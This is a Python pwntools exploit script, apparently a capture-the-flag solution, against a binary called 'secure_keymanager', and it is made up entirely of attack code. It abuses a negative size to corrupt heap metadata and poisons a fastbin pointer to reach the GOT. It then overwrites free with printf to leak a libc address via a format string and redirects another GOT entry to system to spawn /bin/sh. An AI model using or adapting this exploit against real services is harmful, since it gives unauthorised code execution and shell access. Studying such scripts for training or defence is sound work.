#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if len(sys.argv) > 1:
    r = remote('', )
else:
    r = remote('127.0.0.1', 4444)

code = ELF('./secure_keymanager')
libc = ELF('./bc.so.6')

context.arch = code.arch
context.log_level = 'debug'

def login():
    r.sendlineafter('>> ', 'qweqwe')
    r.sendlineafter('>> ', 'qweqwe')

def add(size, key, data=False):
    r.sendlineafter('>> ', '1')
    r.sendafter('...', size)
    r.sendafter('...', key)
    if data != False:
        r.sendafter('...', data)
    r.recvuntil('done')
    
def edit(i, data):
    r.sendlineafter('>> ', '3')
    login()
    r.sendlineafter('...', str(i))
    r.sendlineafter('...', data)

def remove(i):
    r.sendlineafter('>> ', '4')
    r.sendlineafter('>> ', 'qweqwe')
    r.sendlineafter('>> ', 'qweqwe')
    r.sendlineafter('...', str(i))


login()
add('-24', 'qwe') #0 
add('8', 'qwe', 'qwe') #1
add('56', 'qwe', 'A'*40) #2
add('40', 'A'*31, 'A'*39) #3
remove(3)
remove(2)
remove(0)
add('-24', 'A'*24+'\xb1') #0 1->size = 0x61

edit(1, flat(
    'a'*8,
    0x61, # size
    0x601ffa,  # fd
    0, # bk
    'C'*72,
    0x51,
    0x602028
    ))
add('56', 'qwe', 'qwe') #2
add('56', 
    flat(
        'A'*14,
        p64(code.plt['printf'])[:-2], #free -> printf
        '\x00'
    ),
    flat(
        'A'*6,
        p64(0x51)[:-2]
    )) # 3
add('16', '%13$llx@', 'qwe') #4
remove(4) # leak 
libc_start_main = int(r.recvuntil('@')[:-1], 16)
libc.address = libc_start_main - 240 - libc.sym['__libc_start_main']
print hex(libc.address)
    
add('40', 'A'*31, 'A'*39) # 4
add('40', 
    flat(
        libc.sym['isnan'], # strchr -> isnsn
        libc.sym['printf'],
        libc.sym['system'], # malloc_usable_size -> system
        p64(libc.sym['read'])[:-2],
        '\x00'
    ),
    flat(
        'qwe'
    )
    ) # 5
add('72', '/bin/sh\x00', 'qwe') #6
r.sendlineafter('>> ', '3')
login()
r.sendlineafter('...', '6')

r.interactive()
